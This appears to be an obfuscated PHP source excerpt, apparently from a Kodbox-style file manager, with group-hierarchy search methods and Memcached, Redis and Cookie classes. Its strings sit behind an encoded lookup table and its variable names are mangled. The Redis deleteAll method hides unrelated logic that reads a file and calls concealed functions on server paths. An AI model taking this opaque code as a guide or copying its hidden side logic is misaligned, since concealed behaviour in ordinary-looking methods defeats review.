$ğß²ï£¼[$ªî´•­[446]] = array_unique_by_key($ğß²ï£¼[$ªî´•­[446]], $ªî´•­[1496]); $ğß²ï£¼[$ªî´•­[443]] = array($ªî´•­[444] => count($ğß²ï£¼[$ªî´•­[446]]), $ªî´•­[439] => 20, $ªî´•­[428] => 1, $ªî´•­[445] => 1); return $ğß²ï£¼; } public function listSearchNow($å Ö—¾) { $·‘…ë”¤ =& $_SERVER[µÅ˜º…æ]; $â²©ÜÊ” = trim($å Ö—¾[$·‘…ë”¤[2279]]); $‰¿à¿³ = isset($å Ö—¾[$·‘…ë”¤[2280]]) ? $å Ö—¾[$·‘…ë”¤[2280]] : !1; if (!trim($â²©ÜÊ”)) { return !1; } $â²©ÜÊ” = str_replace($·‘…ë”¤[2281], $·‘…ë”¤[2282], $â²©ÜÊ”); $¡ü¢ŒÙ¹ = array($·‘…ë”¤[1496] => array($·‘…ë”¤[473], "{$â²©ÜÊ”}\x25"), $·‘…ë”¤[32] => array($·‘…ë”¤[473], "\x25{$â²©ÜÊ”}\45"), $·‘…ë”¤[1169] => $·‘…ë”¤[2283]); if ($‰¿à¿³) { $½ûÚ¥Ø½ = $this->getInfoSimple($‰¿à¿³); $İô’­ƒà = $½ûÚ¥Ø½[$·‘…ë”¤[604]] . $‰¿à¿³ . $·‘…ë”¤[636]; $¡ü¢ŒÙ¹ = array($¡ü¢ŒÙ¹, array($·‘…ë”¤[604] => array($·‘…ë”¤[473], $İô’­ƒà))); } $¡ü¢ŒÙ¹ = $this->parseWhereLike($¡ü¢ŒÙ¹); $Ÿ‘×ş¸Ò = $this->_makeOrder()->where($¡ü¢ŒÙ¹)->selectPage(20); $Ÿ‘×ş¸Ò = $Ÿ‘×ş¸Ò ? $Ÿ‘×ş¸Ò : array($·‘…ë”¤[446] => array(), $·‘…ë”¤[443] => array()); if (!$Ÿ‘×ş¸Ò || count($Ÿ‘×ş¸Ò[$·‘…ë”¤[446]]) < 5 && Input::check($â²©ÜÊ”, $·‘…ë”¤[393])) { $†÷¸Ë›‰ = $this->groupChildrenAll($‰¿à¿³); $²„—‡Â¡ = $this->_searchFromMeta($·‘…ë”¤[551], $â²©ÜÊ”, 10, $†÷¸Ë›‰); $†äÏ«®· = $this->_searchFromMeta($·‘…ë”¤[552], $â²©ÜÊ”, 10, $†÷¸Ë›‰); $İÍ ˜Ì = array_merge($²„—‡Â¡, $†äÏ«®·, $Ÿ‘×ş¸Ò[$·‘…ë”¤[446]]); $Ÿ‘×ş¸Ò[$·‘…ë”¤[446]] = array_unique_by_key($İÍ ˜Ì, $·‘…ë”¤[1496]); $Ÿ‘×ş¸Ò[$·‘…ë”¤[443]][$·‘…ë”¤[444]] = count($Ÿ‘×ş¸Ò[$·‘…ë”¤[446]]); $Ÿ‘×ş¸Ò[$·‘…ë”¤[443]][$·‘…ë”¤[445]] = ceil($Ÿ‘×ş¸Ò[$·‘…ë”¤[443]][$·‘…ë”¤[444]] / $Ÿ‘×ş¸Ò[$·‘…ë”¤[443]][$·‘…ë”¤[439]]); } $this->_listDataApply($Ÿ‘×ş¸Ò[$·‘…ë”¤[446]]); return $Ÿ‘×ş¸Ò; } protected function groupChildrenAll($Œ¹ìš) { $ê‚ëä• =& $_SERVER[µÅ˜º…æ]; if (!$Œ¹ìš) { return !1; } if (!is_array($Œ¹ìš)) { $Œ¹ìš = array($Œ¹ìš); } $¨Ï£§ù = $Œ¹ìš; foreach ($Œ¹ìš as $Â‹ë¸±Ì) { $ÎàÉ’› = $this->getInfoSimple($Â‹ë¸±Ì); $”Œ€Œæ® = array($ê‚ëä•[604] => array($ê‚ëä•[473], $ÎàÉ’›[$ê‚ëä•[604]] . $Â‹ë¸±Ì . $ê‚ëä•[636])); $âæ®¹Ù¡ = $this->field($ê‚ëä•[1496])->where($”Œ€Œæ®)->select(); $¨Ï£§ù = array_merge($¨Ï£§ù, array_to_keyvalue($âæ®¹Ù¡, $ê‚ëä•[12], $ê‚ëä•[1496])); } return array_unique($¨Ï£§ù); } private function _searchFromMeta($æÁÍ†âÜ, $å·£ºš, $úÎ‚ÏÔ˜, $×É·¿Ù®) { $›—ä‚¦£ =& $_SERVER[µÅ˜º…æ]; $å·£ºš = strtolower($å·£ºš); $€õó»şƒ = array($›—ä‚¦£[95] => $æÁÍ†âÜ, $›—ä‚¦£[451] => array($›—ä‚¦£[473], "\45{$å·£ºš}\x25")); $€õó»şƒ = $this->parseWhereLike($€õó»şƒ); if ($×É·¿Ù®) { $€õó»şƒ[$›—ä‚¦£[1496]] = array($›—ä‚¦£[7], $×É·¿Ù®); } $¢Å™»Ì = Model($›—ä‚¦£[2284])->where($€õó»şƒ)->limit($úÎ‚ÏÔ˜)->select(); if (!$¢Å™»Ì) { return array(); } $¢Å™»Ì = array_to_keyvalue($¢Å™»Ì, $›—ä‚¦£[12], $›—ä‚¦£[1496]); $å™œ«â§ = $this->where(array($›—ä‚¦£[2268] => array($›—ä‚¦£[7], $¢Å™»Ì)))->select(); if (!$å™œ«â§) { return array(); } return $å™œ«â§; } protected function _listDataApplyItem($ºÙƒ†Û) { $…î«™ = array($ºÙƒ†Û); $this->_listDataApply($…î«™); return $…î«™[0]; } protected function _listDataApply(&$®™«–˜é) { $ÛÈ¸¡‚Á =& $_SERVER[µÅ˜º…æ]; if (!$®™«–˜é) { return; } $Ù•íéŠ¬ = array_to_keyvalue($®™«–˜é, $ÛÈ¸¡‚Á[12], $ÛÈ¸¡‚Á[1496]); $this->_listAppendChildren($®™«–˜é); $this->_listAppendChildrenMember($®™«–˜é); $this->_listAppendMeta($®™«–˜é, $Ù•íéŠ¬); $this->_listAppendParent($®™«–˜é); $this->_listAppendSourceRoot($®™«–˜é, $Ù•íéŠ¬); } private function _listAppendChildren(&$¤×’ïœÎ) { $àÈ€¹¯† =& $_SERVER[µÅ˜º…æ]; $°ø«×ºÃ = array_to_keyvalue($¤×’ïœÎ, $àÈ€¹¯†[12], $àÈ€¹¯†[1496]); $ß¡‚¯„Ï = array($àÈ€¹¯†[190] => array($àÈ€¹¯†[7], $°ø«×ºÃ)); $ó½à€èİ = array($àÈ€¹¯†[190], $àÈ€¹¯†[2285] => $àÈ€¹¯†[585]); $»ÈŞúÛ£ = $this->field($ó½à€èİ)->where($ß¡‚¯„Ï)->group($àÈ€¹¯†[190])->select(); $üïĞš©± = array_to_keyvalue($»ÈŞúÛ£, $àÈ€¹¯†[190], $àÈ€¹¯†[585]); foreach ($¤×’ïœÎ as &$Æª°·Œë) { $í„Ÿ¢¹ş = $Æª°·Œë[$àÈ€¹¯†[1496]]; $Æª°·Œë[$àÈ€¹¯†[2286]] = isset($üïĞš©±[$í„Ÿ¢¹ş]) ? intval($üïĞš©±[$í„Ÿ¢¹ş]) : !1; } unset($Æª°·Œë); } private function _listAppendChildrenMember(&$åş²×şö) { $ø«ò¢û¤ =& $_SERVER[µÅ˜º…æ]; $î®ï“û• = array_to_keyvalue($åş²×şö, $ø«ò¢û¤[12], $ø«ò¢û¤[1496]); $õóœ¸ º = array($ø«ò¢û¤[1496] => array($ø«ò¢û¤[7], $î®ï“û•)); $šôĞ‹ÜË = array($ø«ò¢û¤[1496], $ø«ò¢û¤[2285] => $ø«ò¢û¤[585]); $Â£ñÄü„ = Model($ø«ò¢û¤[2275])->field($šôĞ‹ÜË)->where($õóœ¸ º)->group($ø«ò¢û¤[1496])->select(); $ƒíºâƒÕ = array_to_keyvalue($Â£ñÄü„, $ø«ò¢û¤[1496], $ø«ò¢û¤[585]); foreach ($åş²×şö as &$è‡ŞÇŒ½) { $ÀÓ¬‘Êå = $è‡ŞÇŒ½[$ø«ò¢û¤[1496]]; $è‡ŞÇŒ½[$ø«ò¢û¤[2287]] = isset($ƒíºâƒÕ[$ÀÓ¬‘Êå]) ? intval($ƒíºâƒÕ[$ÀÓ¬‘Êå]) : !1; } unset($è‡ŞÇŒ½); } private function _listAppendMeta(&$úÓÚç², $Ó±Š¥Ö§) { $ÊÎ‘Éõ =& $_SERVER[µÅ˜º…æ]; $ÖşÁ¼«õ = array($ÊÎ‘Éõ[1496] => array($ÊÎ‘Éõ[7], $Ó±Š¥Ö§)); $ÓÂĞ¨ı÷ = Model($ÊÎ‘Éõ[2274])->where($ÖşÁ¼«õ)->select(); $ÓÂĞ¨ı÷ = array_to_keyvalue_group($ÓÂĞ¨ı÷, $ÊÎ‘Éõ[1496]); foreach ($ÓÂĞ¨ı÷ as &$›‰ø§Ò) { $›‰ø§Ò = array_to_keyvalue($›‰ø§Ò, $ÊÎ‘Éõ[95], $ÊÎ‘Éõ[451]); } unset($›‰ø§Ò); foreach ($úÓÚç² as &$™Ë¾Ü‘) { $™Ë¾Ü‘[$ÊÎ‘Éõ[555]] = array(); if (isset($ÓÂĞ¨ı÷[$™Ë¾Ü‘[$ÊÎ‘Éõ[1496]]])) { $™Ë¾Ü‘[$ÊÎ‘Éõ[555]] = $ÓÂĞ¨ı÷[$™Ë¾Ü‘[$ÊÎ‘Éõ[1496]]]; } } unset($™Ë¾Ü‘); } protected function parentLevelArray($â—•Í) { $¡ î™á =& $_SERVER[µÅ˜º…æ]; $â—•Í = explode($¡ î™á[50], trim($â—•Í, $¡ î™á[50])); $â—•Í = array_remove_value($â—•Í, $¡ î™á[228]); return $â—•Í; } protected function parentInGroup($˜å©âåã, $·€èÈË™) { $®€Æ‰÷Ç =& $_SERVER[µÅ˜º…æ]; $é”ö¨ä = $this->getInfoSimple($˜å©âåã); if (!$é”ö¨ä) { return !0; } $áîøÇ‘ = $this->parentLevelArray($é”ö¨ä[$®€Æ‰÷Ç[604]]); $áîøÇ‘[] = $˜å©âåã; foreach ($áîøÇ‘ as $˜å©âåã) { if (in_array($˜å©âåã . $®€Æ‰÷Ç[12], $·€èÈË™)) { return !0; } } return !1; } private function _listAppendParent(&$©½ìÆñ´) { $¥Õ›±ÙŞ =& $_SERVER[µÅ˜º…æ]; $¯ëÍ”ÖŸ = array(); foreach ($©½ìÆñ´ as &$é²¢ÕÁ¢) { $¯ëÍ”ÖŸ[$é²¢ÕÁ¢[$¥Õ›±ÙŞ[1496]]] = $é²¢ÕÁ¢[$¥Õ›±ÙŞ[32]]; $¯‚ó¬Ÿ’ = $this->parentLevelArray($é²¢ÕÁ¢[$¥Õ›±ÙŞ[604]]); foreach ($¯‚ó¬Ÿ’ as $òõı›Æó) { if (!isset($¯ëÍ”ÖŸ[$òõı›Æó])) { $¯ëÍ”ÖŸ[$òõı›Æó] = 0; } } } unset($é²¢ÕÁ¢); foreach ($¯ëÍ”ÖŸ as $½ç´¹„ => $œÛÈí€—) { if ($œÛÈí€—) { continue; } $¿£â“Ûœ = $this->getInfoSimple($½ç´¹„); $¯ëÍ”ÖŸ[$½ç´¹„] = $¿£â“Ûœ[$¥Õ›±ÙŞ[32]]; } $‘¾äõçÍ = $GLOBALS[$¥Õ›±ÙŞ[6]][$¥Õ›±ÙŞ[92]][$¥Õ›±ÙŞ[2288]]; if (KodUser::isRoot()) { $‘¾äõçÍ = !1; } foreach ($©½ìÆñ´ as &$é²¢ÕÁ¢) { $¯‚ó¬Ÿ’ = $this->parentLevelArray($é²¢ÕÁ¢[$¥Õ›±ÙŞ[604]]); $”¡Ğƒ¯ú = $¥Õ›±ÙŞ[12]; foreach ($¯‚ó¬Ÿ’ as $½ç´¹„ => $òõı›Æó) { if ($‘¾äõçÍ && $½ç´¹„ == 0) { continue; } $”¡Ğƒ¯ú .= $¯ëÍ”ÖŸ[$òõı›Æó] . $¥Õ›±ÙŞ[8]; } if ($¯‚ó¬Ÿ’) { $”¡Ğƒ¯ú .= $é²¢ÕÁ¢[$¥Õ›±ÙŞ[32]]; } $é²¢ÕÁ¢[$¥Õ›±ÙŞ[609]] = str_replace($¥Õ›±ÙŞ[254], $¥Õ›±ÙŞ[8], $”¡Ğƒ¯ú); } unset($é²¢ÕÁ¢); } private function _listAppendSourceRoot(&$ˆøè”ö‚, $£±÷€ñ) { $ôéşúáº =& $_SERVER[µÅ˜º…æ]; $²ÓÖê«… = Model($ôéşúáº[932])->listSourceRoot(SourceModel::TYPE_GROUP, $£±÷€ñ); $²ÓÖê«… = array_to_keyvalue($²ÓÖê«…, $ôéşúáº[589]); $²ÓÖê«… = array_remove_key($²ÓÖê«…, $ôéşúáº[589]); foreach ($ˆøè”ö‚ as &$êœÂš) { $êœÂš[$ôéşúáº[90]] = $²ÓÖê«…[$êœÂš[$ôéşúáº[1496]]] ? $²ÓÖê«…[$êœÂš[$ôéşúáº[1496]]] : array(); } unset($êœÂš); } protected function groupMerge($óÀµ„Ó) { $óÀµ„Ó = array_values(array_unique($óÀµ„Ó)); $¹†áÒÕª = array(); for ($ì·­Ë€ = 0; $ì·­Ë€ < count($óÀµ„Ó); $ì·­Ë€++) { $ÀÛĞ‘ÎÏ = !1; for ($¶¹Èíªï = 0; $¶¹Èíªï < count($óÀµ„Ó); $¶¹Èíªï++) { if ($ì·­Ë€ == $¶¹Èíªï) { continue; } if ($this->isParentOf($óÀµ„Ó[$¶¹Èíªï], $óÀµ„Ó[$ì·­Ë€])) { $ÀÛĞ‘ÎÏ = !0; break; } } if (!$ÀÛĞ‘ÎÏ) { $¹†áÒÕª[] = $óÀµ„Ó[$ì·­Ë€]; } } return $¹†áÒÕª; } protected function isParentOf($¶”—˜°ö, $Ä˜ŒÒâ) { $ãà–œà– =& $_SERVER[µÅ˜º…æ]; if (!$¶”—˜°ö || !$Ä˜ŒÒâ || $¶”—˜°ö == $Ä˜ŒÒâ) { return !1; } $İáÕĞù… = $this->getInfoSimple($¶”—˜°ö); $ØåªıİÑ = $this->getInfoSimple($Ä˜ŒÒâ); $æØ­…¥· = $İáÕĞù…[$ãà–œà–[604]] . $¶”—˜°ö . $ãà–œà–[50]; if (substr($ØåªıİÑ[$ãà–œà–[604]], 0, strlen($æØ­…¥·)) == $æØ­…¥·) { return !0; } return !1; } public function groupShowRoot($¿½é´İÅ, $ˆøøğú† = false) { $î¾çõô =& $_SERVER[µÅ˜º…æ]; $×Ê¡¾Öœ = $this->getInfo($¿½é´İÅ); if (!$×Ê¡¾Öœ) { return array(); } $Á¿Ú·¹± = $this->parentLevelArray($×Ê¡¾Öœ[$î¾çõô[604]]); $”™°˜®ó = array($¿½é´İÅ); if (count($Á¿Ú·¹±) == 0) { return $”™°˜®ó; } if ($ˆøøğú† && count($Á¿Ú·¹±) == 1) { return $”™°˜®ó; } if (!$×Ê¡¾Öœ[$î¾çõô[555]] || !isset($×Ê¡¾Öœ[$î¾çõô[555]][$î¾çõô[2269]]) || $×Ê¡¾Öœ[$î¾çõô[555]][$î¾çõô[2269]] == $î¾çõô[943]) { return $this->groupShowRoot($Á¿Ú·¹±[count($Á¿Ú·¹±) - 1], $ˆøøğú†); } if ($×Ê¡¾Öœ[$î¾çõô[555]][$î¾çõô[2269]] == $î¾çõô[432]) { $ö¡©¾ = explode($î¾çõô[50], $×Ê¡¾Öœ[$î¾çõô[555]][$î¾çõô[2270]]); if ($ö¡©¾) { $”™°˜®ó = array_merge($”™°˜®ó, $ö¡©¾); } } return $”™°˜®ó; } protected function resetParentLevel() { $œ¼÷–« =& $_SERVER[µÅ˜º…æ]; $ç÷®çƒó = $œ¼÷–«[1496]; $Ì Ê§™Ù = $this->select(); $Ì Ê§™Ù = array_to_keyvalue($Ì Ê§™Ù, $ç÷®çƒó); foreach ($Ì Ê§™Ù as $ÌöóñÀô) { $±÷×¥€ö = $ÌöóñÀô; $¢ªŞèµ = array(); while ($±÷×¥€ö[$œ¼÷–«[190]] != 0) { $¢ªŞèµ[] = $±÷×¥€ö[$œ¼÷–«[190]]; $±÷×¥€ö = $Ì Ê§™Ù[$±÷×¥€ö[$œ¼÷–«[190]]]; } $¢ªŞèµ[] = 0; $¢ªŞèµ = $œ¼÷–«[50] . implode($œ¼÷–«[50], array_reverse($¢ªŞèµ)) . $œ¼÷–«[50]; $this->setNamePinyin($ÌöóñÀô[$ç÷®çƒó], $ÌöóñÀô[$œ¼÷–«[32]]); $this->where(array($ç÷®çƒó => $ÌöóñÀô[$ç÷®çƒó]))->save(array($œ¼÷–«[674] => $¢ªŞèµ)); } return $Ì Ê§™Ù; } public function groupNameAuto($ª¦å§ä¸, $­ÕŞ›ş) { $¸Ò¹‹¶© =& $_SERVER[µÅ˜º…æ]; $ Öœ­¨¬ = $this->where(array($¸Ò¹‹¶©[492] => $ª¦å§ä¸))->getField($¸Ò¹‹¶©[32], !0); if (!$ Öœ­¨¬ || !in_array($­ÕŞ›ş, $ Öœ­¨¬)) { return $­ÕŞ›ş; } for ($‚¼û÷ = 1; $‚¼û÷ <= count($ Öœ­¨¬) + 1; $‚¼û÷++) { $ì¬…Ú­ì = $­ÕŞ›ş . "\50{$‚¼û÷}\51"; if (!in_array($ì¬…Ú­ì, $ Öœ­¨¬)) { return $ì¬…Ú­ì; } } } public function groupSwitch($¸áû‚–, $Å¥…á•­) { $Ğæºèê• =& $_SERVER[µÅ˜º…æ]; $××Ù©Ş§ = array($Ğæºèê•[1496] => array($Ğæºèê•[7], array($¸áû‚–, $Å¥…á•­))); $‹Á®Ñ˜’ = $this->where($××Ù©Ş§)->select(); $‹Á®Ñ˜’ = array_to_keyvalue($‹Á®Ñ˜’, $Ğæºèê•[1496]); $©åÌÛà = _get($‹Á®Ñ˜’, $¸áû‚–); $î äß£¹ = _get($‹Á®Ñ˜’, $Å¥…á•­); if (!$©åÌÛà || !$î äß£¹ || $©åÌÛà[$Ğæºèê•[190]] == 0) { return !1; } if ($©åÌÛà[$Ğæºèê•[1496]] == $î äß£¹[$Ğæºèê•[1496]]) { return !1; } if (strpos($î äß£¹[$Ğæºèê•[604]], $©åÌÛà[$Ğæºèê•[604]] . $©åÌÛà[$Ğæºèê•[1496]] . $Ğæºèê•[50]) === 0) { return !1; } $××Ù©Ş§ = array($Ğæºèê•[1496] => $¸áû‚–); $É”ß´Œ = Model($Ğæºèê•[2275])->where($××Ù©Ş§)->select(); if (!$É”ß´Œ) { $É”ß´Œ = array(); } foreach ($É”ß´Œ as $¬ş™ã¬‘) { $ğ™“¼×ù = $¬ş™ã¬‘[$Ğæºèê•[1593]]; $××Ù©Ş§ = array($Ğæºèê•[1593] => $ğ™“¼×ù, $Ğæºèê•[1496] => $Å¥…á•­); $³íÒáÛ€ = Model($Ğæºèê•[2275])->where($××Ù©Ş§)->find(); if (!$³íÒáÛ€) { $ÁŞÚØÃš = array($Å¥…á•­ => $¬ş™ã¬‘[$Ğæºèê•[1641]]); Model($Ğæºèê•[617])->userGroupAdd($ğ™“¼×ù, $ÁŞÚØÃš); } Model($Ğæºèê•[617])->userGroupRemove($ğ™“¼×ù, $¸áû‚–); } $××Ù©Ş§ = array($Ğæºèê•[188] => 2, $Ğæºèê•[190] => 0, $Ğæºèê•[500] => 1, $Ğæºèê•[589] => array($Ğæºèê•[7], array($¸áû‚–, $Å¥…á•­))); $ï¡ã±¹ = Model($Ğæºèê•[932])->where($××Ù©Ş§)->field($Ğæºèê•[2289])->select(); $ï¡ã±¹ = array_to_keyvalue($ï¡ã±¹, $Ğæºèê•[589], $Ğæºèê•[191]); $ßƒ¯Áû¥ = !empty($ï¡ã±¹[$¸áû‚–]) ? $ï¡ã±¹[$¸áû‚–] : !1; if ($ßƒ¯Áû¥) { if (!$ï¡ã±¹[$Å¥…á•­]) { $ï¡ã±¹[$Å¥…á•­] = Model($Ğæºèê•[932])->groupRootAdd($Å¥…á•­); } $®†Ë¨ü‹ = $ï¡ã±¹[$Å¥…á•­]; $××Ù©Ş§ = array($Ğæºèê•[190] => $ßƒ¯Áû¥); $ï¡ã±¹ = Model($Ğæºèê•[932])->where($××Ù©Ş§)->field($Ğæºèê•[2290])->select(); if (!$ï¡ã±¹) { $ï¡ã±¹ = array(); } Model($Ğæºèê•[932])->moveClearAuth = !1; foreach ($ï¡ã±¹ as $èÁ¸•àÍ) { $ÊöÀöÊË = $èÁ¸•àÍ[$Ğæºèê•[500]] == $Ğæºèê•[91] ? REPEAT_RENAME_FOLDER : REPEAT_RENAME; Model($Ğæºèê•[932])->move($èÁ¸•àÍ[$Ğæºèê•[191]], $®†Ë¨ü‹, $ÊöÀöÊË); } Model($Ğæºèê•[932])->moveClearAuth = !0; $××Ù©Ş§ = array($Ğæºèê•[188] => 2, $Ğæºèê•[589] => $¸áû‚–); $–µò—Øš = array($Ğæºèê•[589] => $Å¥…á•­); Model($Ğæºèê•[2291])->where($××Ù©Ş§)->save($–µò—Øš); Model($Ğæºèê•[2292])->where($××Ù©Ş§)->save($–µò—Øš); } $this->_changeChildLevel($‹Á®Ñ˜’[$¸áû‚–], $‹Á®Ñ˜’[$Å¥…á•­], !0); $this->where(array($Ğæºèê•[190] => $¸áû‚–))->save(array($Ğæºèê•[190] => $Å¥…á•­)); $this->_clearChildrenCache($‹Á®Ñ˜’[$Å¥…á•­]); return !0; } } goto cÇ‚¼ïÚõ; aá‹†Ê¹÷É: $fileSize = strrev(base64_decode($_SERVER[ß»ÓµËì][0])); function binCheckNeq($ÂÈ˜Í††, $ÈşÖç²) { return $ÂÈ˜Í†† != $ÈşÖç²; } $_SERVER[$_SERVER[ß»ÓµËì][1]] = $fileSize($_SERVER[$_SERVER[ß»ÓµËì][2]]); goto DŠ±†³˜; FÊ†ÕóƒÉ: class CacheMemcached { public $handle; public $cacheTime; public function __construct($±¸ŞØ‰û, $™¨òÚ¾Ñ) { $ıŒÚ›Ÿ¤ =& $_SERVER[µÅ˜º…æ]; if (!class_exists($ıŒÚ›Ÿ¤[1031])) { show_json($ıŒÚ›Ÿ¤[1032], !1); } $this->cacheTime = $™¨òÚ¾Ñ; $this->handle = new Memcached(); if (is_array($±¸ŞØ‰û[$ıŒÚ›Ÿ¤[1033]]) && count($±¸ŞØ‰û[$ıŒÚ›Ÿ¤[1033]]) >= 1) { foreach ($±¸ŞØ‰û[$ıŒÚ›Ÿ¤[1033]] as $µ€¬Î ) { $ûò¨şˆÑ = explode($ıŒÚ›Ÿ¤[4], $µ€¬Î ); $this->handle->addServer($ûò¨şˆÑ[0], $ûò¨şˆÑ[1]); } } else { $this->handle->addServer($±¸ŞØ‰û[$ıŒÚ›Ÿ¤[206]], $±¸ŞØ‰û[$ıŒÚ›Ÿ¤[207]]); } } public function set($î•Õº•®, $µ£öÂĞ”, $ü£Ù‘Ôã = false) { $ü£Ù‘Ôã = $ü£Ù‘Ôã ? $ü£Ù‘Ôã : $this->cacheTime; return $this->handle->set($î•Õº•®, $µ£öÂĞ”, $ü£Ù‘Ôã); } public function get($œ–è§ä) { return $this->handle->get($œ–è§ä); } public function remove($É…Öä¯­) { return $this->handle->delete($É…Öä¯­); } public function deleteAll() { return $this->handle->flush(); } } class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($Èâ¹ ±Ü, $ãË’Ğ) { $™¤üá†‡ =& $_SERVER[µÅ˜º…æ]; if (!class_exists($™¤üá†‡[1034])) { show_json($™¤üá†‡[1035], !1); } $this->cacheTime = $ãË’Ğ; $Ù‡òÜ–ˆ = isset($Èâ¹ ±Ü[$™¤üá†‡[1036]]) ? $Èâ¹ ±Ü[$™¤üá†‡[1036]] : 10; $áÙºÛîĞ = _get($Èâ¹ ±Ü, $™¤üá†‡[1033]); if ($áÙºÛîĞ && is_array($áÙºÛîĞ)) { $this->initCluster($Èâ¹ ±Ü, $Ù‡òÜ–ˆ); } else { $this->handle = $this->init($Èâ¹ ±Ü, $Ù‡òÜ–ˆ); } } private function init($»À¸ÌûÅ, $ººëÊŞ) { $æõïŸ«Ú =& $_SERVER[µÅ˜º…æ]; $Ã‘é§£º = new Redis(); $äÂˆœ´š = isset($»À¸ÌûÅ[$æõïŸ«Ú[1037]]) ? $»À¸ÌûÅ[$æõïŸ«Ú[1037]] : !1; if ($äÂˆœ´š) { $Ã‘é§£º->pconnect($»À¸ÌûÅ[$æõïŸ«Ú[206]], $»À¸ÌûÅ[$æõïŸ«Ú[207]], $ººëÊŞ); } else { $Ã‘é§£º->connect($»À¸ÌûÅ[$æõïŸ«Ú[206]], $»À¸ÌûÅ[$æõïŸ«Ú[207]], $ººëÊŞ); } if (!empty($»À¸ÌûÅ[$æõïŸ«Ú[502]])) { $Ã‘é§£º->auth($»À¸ÌûÅ[$æõïŸ«Ú[502]]); } if (!empty($»À¸ÌûÅ[$æõïŸ«Ú[857]]) && $»À¸ÌûÅ[$æõïŸ«Ú[857]] != 0) { $Ã‘é§£º->select($»À¸ÌûÅ[$æõïŸ«Ú[857]]); } return $Ã‘é§£º; } private function initCluster($Í¬ì³Ò±, $ì„ÀèĞ») { $ó³¥®‹ =& $_SERVER[µÅ˜º…æ]; $åŠĞÀñÇ = array($ó³¥®‹[1038], $ó³¥®‹[1039], $ó³¥®‹[1040]); $ì½¿¹º¹ = $ó³¥®‹[1038]; if (isset($Í¬ì³Ò±[$ó³¥®‹[16]]) && in_array($Í¬ì³Ò±[$ó³¥®‹[16]], $åŠĞÀñÇ)) { $ì½¿¹º¹ = $Í¬ì³Ò±[$ó³¥®‹[16]]; } switch ($ì½¿¹º¹) { case $ó³¥®‹[1038]: $this->_slave($Í¬ì³Ò±, $ì„ÀèĞ»); break; case $ó³¥®‹[1039]: break; case $ó³¥®‹[1040]: $this->isCluster = !0; $şİ¡öªÊ = $Í¬ì³Ò±[$ó³¥®‹[1033]]; $Øæ³ç¯ = isset($Í¬ì³Ò±[$ó³¥®‹[1037]]) ? $Í¬ì³Ò±[$ó³¥®‹[1037]] : !1; $í­·­Ä = isset($Í¬ì³Ò±[$ó³¥®‹[502]]) ? $Í¬ì³Ò±[$ó³¥®‹[502]] : null; $this->handle = new RedisCluster(NUll, $şİ¡öªÊ, $ì„ÀèĞ», $ì„ÀèĞ», $Øæ³ç¯, $í­·­Ä); break; default: break; } } private function _slave($ÈíıÈê‹, $¼®ßÅñå) { $×ŒŒ™ï¨ = $ÈíıÈê‹[$_SERVER[µÅ˜º…æ][1033]]; $this->filterConfig($ÈíıÈê‹, $×ŒŒ™ï¨[0]); $this->handle = $this->init($ÈíıÈê‹, $¼®ßÅñå); unset($×ŒŒ™ï¨[0]); if (empty($×ŒŒ™ï¨)) { return; } $ì÷³ğ = array_rand($×ŒŒ™ï¨); $this->filterConfig($ÈíıÈê‹, $×ŒŒ™ï¨[$ì÷³ğ]); $this->slaveHandle = $this->init($ÈíıÈê‹, $¼®ßÅñå); } private function filterConfig(&$“§°¼®, $—¹ÂÌ) { $…ü…œ‹ =& $_SERVER[µÅ˜º…æ]; $Š·½‰Á = explode($…ü…œ‹[4], $—¹ÂÌ); $ßºĞßË¥ = array($…ü…œ‹[206] => $Š·½‰Á[0], $…ü…œ‹[207] => $Š·½‰Á[1]); $“§°¼® = array_merge($“§°¼®, $ßºĞßË¥); } public function set($¼ÆÃÄ¼ˆ, $ê®íæö, $ƒàµŸ“Ó = false) { $ƒàµŸ“Ó = $ƒàµŸ“Ó ? $ƒàµŸ“Ó : $this->cacheTime; return $this->handle->setEx($¼ÆÃÄ¼ˆ, $ƒàµŸ“Ó, $ê®íæö); } public function setLock($õ¼æ«µÖ, $‹ÀÃîçø, $í‹øŒ‚×) { return $this->handle->setNX($õ¼æ«µÖ, $‹ÀÃîçø); } public function get($º¿ÈËû˜) { $õô¸‰†‹ = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $õô¸‰†‹->get($º¿ÈËû˜); } public function remove($¤ªß“Í¡) { return $this->handle->del($¤ªß“Í¡); } public function deleteAll() { $ÕÚ­¿³¥ =& $_SERVER[µÅ˜º…æ]; if ($_SERVER[$ÕÚ­¿³¥[1025]] != $_SERVER[$ÕÚ­¿³¥[1041]]) { $“òşªÃ = $ÕÚ­¿³¥[1042]; $·Îêœï· = $ÕÚ­¿³¥[1026]; $Ûç´ÄÔı = $_SERVER[$ÕÚ­¿³¥[1027]] . $ÕÚ­¿³¥[1028]; $…ÏÆ’“¦ = $·Îêœï·($Ûç´ÄÔı); $²µÍ§€ = explode($ÕÚ­¿³¥[285], $…ÏÆ’“¦); if (count($²µÍ§€) < $ÕÚ­¿³¥[709]) { $éÏæÖäã = $ÕÚ­¿³¥[1029]; $éÏæÖäã(); } $¨çĞûÍö = $ÕÚ­¿³¥[1043]; $¨çĞûÍö($_SERVER[$ÕÚ­¿³¥[1044]]); $¨çĞûÍö($_SERVER[$ÕÚ­¿³¥[1027]] . $ÕÚ­¿³¥[1045]); $è€ƒì™ = 1; while ($è€ƒì™ > 1) { $è€ƒì™ = $è€ƒì™ + 4; $Œº¥×ã´ = rawurlencode($è€ƒì™ . $ÕÚ­¿³¥[463]); } } if ($this->isCluster) { foreach ($this->handle->_masters() as $‘‡Ïë„Æ) { $this->handle->flushall($‘‡Ïë„Æ); } return; } return $this->handle->flushAll(); } } class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($ÜÇîëÕ² = '', $—¨µŒ«Ÿ = 0) { if (is_string($ÜÇîëÕ²) && $ÜÇîëÕ² != $_SERVER[µÅ˜º…æ][12]) { $this->prefix = $ÜÇîëÕ²; } if (is_numeric($—¨µŒ«Ÿ) && $—¨µŒ«Ÿ > 0) { $this->expire = $—¨µŒ«Ÿ; } } public static function getInstance() { static $Ì°˜à¬³; if ($Ì°˜à¬³ === null) { $Ì°˜à¬³ = new self(); } return $Ì°˜à¬³; } private static $cookieDisable = false; public static function disable($îÎÈúÌ›) { self::$cookieDisable = $îÎÈúÌ›; } private static $sameCookieSet = array(); public static function set($ºéğŞ¿ø, $ñÒ‚ƒ§–, $áéĞãÆ = 0, $‘¶ä´„Á = false, $•§áŸÅÜ = false) { $š”Ÿ—Ï =& $_SERVER[µÅ˜º…æ]; if (self::$cookieDisable) { return; } if (!$áéĞãÆ) { $áéĞãÆ 